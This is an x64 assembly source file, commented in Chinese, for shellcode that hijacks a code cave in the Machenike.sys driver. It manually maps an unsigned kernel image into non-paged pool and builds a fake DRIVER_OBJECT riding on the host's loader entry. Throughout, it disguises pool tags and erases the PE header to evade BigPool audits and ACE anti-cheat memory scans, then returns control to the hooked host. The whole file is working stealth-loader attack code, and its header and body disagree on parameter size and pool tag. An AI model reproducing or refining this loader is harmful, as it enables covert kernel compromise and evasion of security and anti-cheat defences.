; ============================================================
; shellcode.asm — mswsk 内存加载器 Shellcode (x64)
;
; 特性：
;   1. 100 字节紧凑参数块 (0x64)，安全驻留于 .text Code Cave
;   2. call/pop 相对寻址定位参数块，不依赖外部寄存器传参
;   3. ExAllocatePoolWithTag(NonPagedPool=0x0, ImageSize+0x200) 分配内核内存
;      Pool Tag 伪装为 'FMsl'(0x6C734D46) MiniFilter 系统 Tag，规避 BigPool 审计
;      额外 0x200 字节用于在 Pool 尾部构造常驻伪 DRIVER_OBJECT
;   4. MmCopyMemory(MM_COPY_MEMORY_VIRTUAL) 从当前进程虚拟地址安全拷贝镜像
;   5. 完整的 PE 64 位基址重定位循环 (Base Relocation Loop)
;   6. 在 pKernelImage + ImageSize 处构造伪 DRIVER_OBJECT（借壳宿主驱动 LDR 条目）
;      mswsk 的 Stealth_InsertFakeLdrEntry 将完全寄生并对齐 Machenike.sys
;   7. 调用 DriverEntry(fakeDriverObj, NULL)
;   8. 恢复现场并通过 jmp r11 跳回宿主驱动现场 (site.kernVA + 5) 平稳完成 IRP
; ============================================================

.code

; ShellcodeParams 结构体偏移定义（100 字节 = 64h，#pragma pack(1)）
PARAMS_ExAllocatePoolWithTag = 00h ; 8 bytes
PARAMS_ExFreePoolWithTag     = 08h ; 8 bytes
PARAMS_MmCopyMemory          = 10h ; 8 bytes
PARAMS_UserImageVA           = 18h ; 8 bytes
PARAMS_ImageSize             = 20h ; 4 bytes
PARAMS_EntryPointOffset      = 24h ; 4 bytes
PARAMS_RelocDirRVA           = 28h ; 4 bytes
PARAMS_RelocDirSize          = 2Ch ; 4 bytes
PARAMS_OriginalImageBase     = 30h ; 8 bytes
PARAMS_Completed             = 38h ; 4 bytes (保留备用)
PARAMS_Status                = 3Ch ; 4 bytes (保留备用)
PARAMS_AllocatedPoolVA       = 40h ; 8 bytes (保留备用)
PARAMS_HookReturnVA          = 48h ; 8 bytes: 跳回宿主驱动现场 (site.kernVA + 5)
PARAMS_WhqlDrvBase           = 50h ; 8 bytes: 宿主驱动 (Machenike.sys) 内核 VA
PARAMS_WhqlDrvSize           = 58h ; 4 bytes: 宿主驱动镜像大小 (SizeOfImage)
PARAMS_WhqlLdrEntryVA        = 5Ch ; 8 bytes: 宿主驱动 KLDR_DATA_TABLE_ENTRY 内核 VA
PARAMS_BootConfig            = 64h ; 20 bytes: DRV_BOOT_CONFIG (Magic, Mode, Port, Token, Flags)
PARAMS_TOTAL_SIZE            = 78h ; 120 字节

; DRIVER_OBJECT 关键字段偏移
DROBJ_DriverStart   = 18h   ; Ptr64 DriverStart
DROBJ_DriverSize    = 20h   ; ULONG DriverSize
DROBJ_DriverSection = 28h   ; Ptr64 DriverSection (KLDR_DATA_TABLE_ENTRY*)

PUBLIC Shellcode_Entry

Shellcode_Entry PROC
    ; 1. 获取当前指令地址并定位参数块（使用易失寄存器 r11，处于函数最首行）
    ; 内存布局：[ShellcodeParams (120 字节 = 78h)] [Shellcode_Entry ...]
    ; 此时位于函数最首行，call 占 5 字节
    ; get_ip 距离 ShellcodeParams 起始处精确为 5 + 78h = 7Dh
    call get_ip
get_ip:
    pop r11
    sub r11, 7Dh                 ; r11 精确指向 ShellcodeParams 首地址

    ; 2. 保存非易失性寄存器并分配影子栈
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 38h

    mov rbx, r11                 ; rbx 获得 ShellcodeParams 基址指针

    ; 3. ExAllocatePoolWithTag(NonPagedPool=0x0, ImageSize + 0x200, 'MmSt')
    ; +0x200 额外空间用于在 Pool 尾部构造常驻伪 DRIVER_OBJECT
    ; DRIVER_OBJECT 完整大小 = 0x150，取 0x200 以保证足够余量
    ; Tag = 'MmSt' (0x74536D4D) 伪装为内存管理器 Standby Table 标签，合规多页缓冲，规避 BigPool 审计
    xor ecx, ecx                 ; PoolType = NonPagedPool = 0x0（可执行，规避 DEP）
    mov edx, DWORD PTR [rbx + PARAMS_ImageSize]
    add edx, 200h                ; 额外 0x200 字节用于伪 DRIVER_OBJECT
    mov r8d, 74536D4Dh           ; Tag = 'MmSt'
    call QWORD PTR [rbx + PARAMS_ExAllocatePoolWithTag]
    test rax, rax
    jz fail_alloc

    mov r12, rax             ; r12 = pKernelImage（内核池基址）

    ; 4. MmCopyMemory(pKernelImage, UserImageVA, ImageSize, MM_COPY_MEMORY_VIRTUAL=2, &transferred)
    mov rcx, r12
    mov rdx, QWORD PTR [rbx + PARAMS_UserImageVA]
    mov r8d, DWORD PTR [rbx + PARAMS_ImageSize]  ; 精确 32 位读取，避免混入 EntryPointOffset
    mov r9d, 2               ; MM_COPY_MEMORY_VIRTUAL
    lea rax, [rsp + 30h]     ; rax = &transferred（本地栈变量）
    mov QWORD PTR [rsp + 20h], rax ; x64 ABI: 第 5 个参数位于 [rsp + 20h]
    call QWORD PTR [rbx + PARAMS_MmCopyMemory]
    test eax, eax
    jnz fail_copy

    ; 5. 执行 PE Base Relocation 重定位循环
    ; 计算 delta = pKernelImage - OriginalImageBase
    mov r13, r12
    sub r13, QWORD PTR [rbx + PARAMS_OriginalImageBase]
    jz skip_reloc            ; delta 为 0 则无需重定位
    cmp DWORD PTR [rbx + PARAMS_RelocDirSize], 0
    jz skip_reloc            ; 无重定位表

    ; r14 = pKernelImage + RelocDirRVA（当前重定位块起始）
    ; r15 = r14 + RelocDirSize（重定位目录结束）
    movsxd rax, DWORD PTR [rbx + PARAMS_RelocDirRVA]
    lea r14, [r12 + rax]
    movsxd rax, DWORD PTR [rbx + PARAMS_RelocDirSize]
    lea r15, [r14 + rax]

reloc_block_loop:
    cmp r14, r15
    jae skip_reloc

    mov edx, DWORD PTR [r14]     ; edx = block->VirtualAddress
    test edx, edx
    jz skip_reloc
    mov ecx, DWORD PTR [r14 + 4] ; ecx = block->SizeOfBlock
    test ecx, ecx
    jz skip_reloc

    ; entry count = (SizeOfBlock - 8) / 2
    sub ecx, 8
    shr ecx, 1
    jz next_block

    lea rsi, [r14 + 8]           ; rsi = 条目起始 (WORD*)

reloc_entry_loop:
    movzx eax, WORD PTR [rsi]
    mov edi, eax
    shr edi, 12                  ; edi = type（entry >> 12）
    cmp edi, 10                  ; 10 = IMAGE_REL_BASED_DIR64
    jne next_entry

    and eax, 0FFFh               ; eax = offset（entry & 0xFFF）
    add eax, edx                 ; eax = block->VirtualAddress + offset（RVA）
    add QWORD PTR [r12 + rax], r13 ; 修补该重定位项 += delta

next_entry:
    add rsi, 2
    dec ecx
    jnz reloc_entry_loop

next_block:
    mov eax, DWORD PTR [r14 + 4]
    add r14, rax
    jmp reloc_block_loop

skip_reloc:
    ; 6. 在 pKernelImage + ImageSize 处构造伪 DRIVER_OBJECT
    ;    借壳宿主 Machenike.sys 的 LDR 条目，让 mswsk 的 Stealth_InsertFakeLdrEntry
    ;    完全寄生于 Machenike.sys，保持模块名与 DllBase 严格一致，规避 ACE 校验异常
    movsxd rdi, DWORD PTR [rbx + PARAMS_ImageSize]
    lea rdi, [r12 + rdi]     ; rdi = fakeDriverObj 基址（Pool 尾部）

    ; 清零整个 DRIVER_OBJECT 区域（0x200 字节）
    ; rep stosb：rdi=目标，rcx=字节数，al=填充值；执行后 rdi 被推进，故先 push 后 pop
    push rdi
    xor eax, eax
    mov ecx, 200h
    rep stosb
    pop rdi                  ; 恢复 rdi = fakeDriverObj 基址

    ; Type (+0x000) = 4（IoDriverObjectType，ObReferenceObjectByHandle 校验字段）
    mov WORD PTR [rdi + 00h], 4
    ; Size (+0x002) = 0x150（sizeof DRIVER_OBJECT，ObReferenceObjectByHandle 次检字段）
    mov WORD PTR [rdi + 02h], 150h

    ; DeviceObject (+0x008) = r12（Pool 基址）
    ; 供 mswsk 的 DriverEntry 读取，用于在 Stealth_InsertFakeLdrEntry 完成后
    ; 将伪 LDR 条目的 DllBase 修正为 Pool 地址，使 ACE IPI 物理扫描能正确覆盖 Pool 页
    mov QWORD PTR [rdi + 08h], r12

    ; DriverStart (+0x018) = whqlDrvBase（宿主 Machenike.sys 内核 VA）
    ; Stealth_InsertFakeLdrEntry 以此在 PsLoadedModuleList 中定位宿主 LDR 条目
    mov rax, QWORD PTR [rbx + PARAMS_WhqlDrvBase]
    mov QWORD PTR [rdi + DROBJ_DriverStart], rax

    ; DriverSize (+0x020) = whqlDrvSize（宿主 Machenike.sys SizeOfImage）
    mov eax, DWORD PTR [rbx + PARAMS_WhqlDrvSize]
    mov DWORD PTR [rdi + DROBJ_DriverSize], eax

    ; DriverSection (+0x028) = whqlLdrEntryVA（宿主 KLDR_DATA_TABLE_ENTRY 内核 VA）
    ; MachenikeUserVarInit 以此为起点遍历 PsLoadedModuleList 查找 ntoskrnl.exe 并解析 API
    mov rax, QWORD PTR [rbx + PARAMS_WhqlLdrEntryVA]
    mov QWORD PTR [rdi + DROBJ_DriverSection], rax

    ; 7. 调用 DriverEntry(fakeDriverObj, &BootConfig)
    mov rcx, rdi             ; rcx = PDRIVER_OBJECT（伪对象）
    lea rdx, [rbx + PARAMS_BootConfig] ; rdx = PDRV_BOOT_CONFIG（内核启动参数）
    mov rax, r12             ; rax = pKernelImage
    movsxd r8, DWORD PTR [rbx + PARAMS_EntryPointOffset]
    add rax, r8              ; rax = DriverEntry VA
    call rax

    test eax, eax
    js fail_entry            ; 若 < 0 (NT_ERROR)，跳到释放 Pool 逻辑

    ; 8. 成功调用 DriverEntry 后，物理擦除内核镜像前 0x1000 字节 (PE 头 + 节表)
    ; 彻底摧毁 MZ / PE 签名，使 ACE IPI 物理内存特征扫描完全失效
    push rdi
    mov rdi, r12             ; rdi = pKernelImage
    xor eax, eax
    mov ecx, 1000h           ; 4096 字节
    rep stosb
    pop rdi

    xor eax, eax             ; 确保状态码为 STATUS_SUCCESS (0)
    jmp done

fail_entry:
    mov esi, eax             ; 保存错误码
    jmp free_pool

fail_copy:
    mov esi, 0C0000001h      ; STATUS_UNSUCCESSFUL

free_pool:
    mov rcx, r12
    mov edx, 74536D4Dh       ; Tag = 'MmSt'
    call QWORD PTR [rbx + PARAMS_ExFreePoolWithTag]
    mov eax, esi             ; 恢复错误码
    jmp done

fail_alloc:
    mov eax, 0C0000017h      ; STATUS_NO_MEMORY

done:
    ; 注意：ShellcodeParams 驻留于宿主驱动 .text 代码段（PAGE_EXECUTE_READ 只读页）
    ; 在开启 CR0.WP 的内核环境下，向其写入会立即触发 BugCheck 0xBE (ATTEMPTED_WRITE_TO_READONLY_MEMORY)
    ; 执行结果已保存在 eax 中，随后会传递给 ebx 并通过 IRP 返回给用户态 DeviceIoControl
    
    ; 提取返回目标地址 (site.kernVA + 5) 到易失寄存器 r11
    mov r11, QWORD PTR [rbx + PARAMS_HookReturnVA]

    ; 释放影子栈空间
    add rsp, 38h

    ; 恢复宿主驱动的非易失性寄存器（与进入时 push 完全对称）
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx

    ; 将 NTSTATUS 写入 ebx（宿主随后将 ebx 写入 Irp->IoStatus.Status 并完成 IRP）
    mov ebx, eax

    ; 平稳跳回宿主现场 (site.kernVA + 5)，执行宿主原有的 jmp loc_cleanup
    jmp r11

Shellcode_Entry ENDP

END
